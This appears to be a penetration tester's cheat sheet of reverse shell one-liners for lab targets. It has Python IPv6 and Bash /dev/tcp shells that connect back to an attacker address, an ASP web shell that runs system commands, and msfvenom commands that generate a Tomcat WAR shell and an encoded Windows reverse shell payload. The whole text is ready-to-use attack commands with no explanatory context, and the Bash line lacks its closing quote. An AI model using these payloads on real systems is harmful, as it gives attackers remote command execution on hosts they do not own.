# RevShells

## Python IPv6

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:4::1000",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);';
```

## Tomcat WAR

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.4 LPORT=443 -f war -o pwned.war
```

## Bash

```
bash -c 'bash -i >& /dev/tcp/10.10.16.11/443 0>&1
```

## **ASP-WebShell**

```jsx
<%response.write CreateObject("WScript.Shell").Exec("ping 10.10.14.13").StdOut.Readall()%>
```

## MSFVenom - Windows Shell

```jsx
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.13 LPORT=443 --platform windows -a x86 -e x86/shikata_ga_nai -f c -b "\x00" EXITFUNC=thread
```